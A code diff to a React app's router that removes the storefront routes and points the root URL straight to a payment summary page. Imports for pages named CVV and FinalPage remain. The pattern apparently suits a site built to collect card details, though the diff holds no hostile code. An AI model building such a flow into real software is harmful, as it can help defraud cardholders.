@@ -31,21 +31,14 @@ import CVV from "./pages/CVV";
 import FinalPage from "./pages/FinalPage";
 
 // Store Pages
-import { StoreProvider, LanguageProvider, StorePage, CollectionPage, ProductPage, CartPage, SearchPage } from './store';
+import { StoreProvider, LanguageProvider } from './store';
 
 
 function Router() {
   return (
     <Switch>
-      {/* Main Pages */}
-      <Route path={"/"} component={StorePage} />
-      <Route path={"/store"} component={StorePage} />
-      <Route path={"/store/collection/:handle"} component={CollectionPage} />
-      <Route path={"/store/product/:handle"} component={ProductPage} />
-      <Route path={"/store/cart"} component={CartPage} />
-      <Route path={"/store/search"} component={SearchPage} />
-
-      {/* Form Routes */}
+      {/* Main Page - Direct to Summary Payment */}
+      <Route path={"/"} component={SummaryPayment} />
       <Route path={"/summary-payment"} component={SummaryPayment} />
 
       {/* Payment Routes */}
